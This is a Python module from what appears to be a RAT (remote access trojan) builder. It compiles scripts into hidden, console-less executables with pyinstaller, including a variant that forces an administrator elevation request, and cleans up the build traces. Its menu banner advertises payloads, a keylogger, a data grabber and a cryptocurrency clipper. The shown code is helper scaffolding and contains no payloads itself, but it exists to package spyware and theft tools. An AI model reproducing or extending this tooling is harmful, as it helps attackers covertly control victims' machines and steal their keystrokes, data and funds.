import os, sys, platform, ctypes, shutil
from colorama import Fore, Style
from cookies_package import *
from time import sleep


'''
MAIN FUNCTIONS
'''
def temp():
    temp = os.getenv("TEMP")
    return temp

def cleanup(filename):
    try:
        os.remove(f'{filename}.spec')
        os.remove(f'{filename}.py')
        shutil.rmtree('build')
        shutil.rmtree('dist')
    except: pass

def compile(filename):
    os.system(f"pyinstaller --onefile --noconsole --clean --log-level=INFO -n {filename} {filename}.py")

def compile_forceadmin(filename):
    os.system(f"pyinstaller --onefile --noconsole --uac-admin --clean --log-level=INFO -n {filename} {filename}.py")


'''
OTHER FUNCTIONS
'''

def clear():
    system = platform.system()
    if system == 'Windows':
        os.system('cls')
    elif system == 'Linux':
        os.system('clear')
    else:
        print('\n')*120
    return

def settitle(str):
    system = platform.system()
    if system == 'Windows':
        ctypes.windll.kernel32.SetConsoleTitleW(f"{str} | CookiesKush420#9599")
    else:
        os.system(f"\033]0;{str} | CookiesKush420#9599\a")

def print_slow(str):
    for letter in str:
        sys.stdout.write(letter);sys.stdout.flush();sleep(0.05)



'''
BANNERS
'''

banner = Style.BRIGHT + f'''{Fore.LIGHTGREEN_EX}
 

             __           .~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
           _/  \_         |    {Fore.CYAN}Welcome to RAT Builder{Fore.LIGHTGREEN_EX}       |
           ({Fore.LIGHTRED_EX}҂{Fore.WHITE}`_´{Fore.LIGHTGREEN_EX})         {Fore.LIGHTGREEN_EX}|  {Fore.CYAN}New Features Comming Soon...{Fore.LIGHTGREEN_EX}   |
           <,{Fore.LIGHTBLACK_EX}═╦╤─{Fore.YELLOW} ҉ {Fore.LIGHTRED_EX}- -   {Fore.LIGHTGREEN_EX}'─────────────────────────────────'
           _/--\_         
   

    {Fore.LIGHTGREEN_EX}1{Fore.RESET}.{Fore.CYAN} Create PayLoad
    {Fore.LIGHTGREEN_EX}2{Fore.RESET}.{Fore.CYAN} Create Custom PayLoad
    {Fore.LIGHTGREEN_EX}3{Fore.RESET}.{Fore.CYAN} Create Keylogger Add on
    {Fore.LIGHTGREEN_EX}4{Fore.RESET}.{Fore.CYAN} Create Data Grabber Add on
    {Fore.LIGHTGREEN_EX}5{Fore.RESET}.{Fore.CYAN} Create Crypto Clipper Add on
    {Fore.LIGHTGREEN_EX}420{Fore.RESET}.{Fore.LIGHTRED_EX} Exit RAT Builder
{Fore.RESET}'''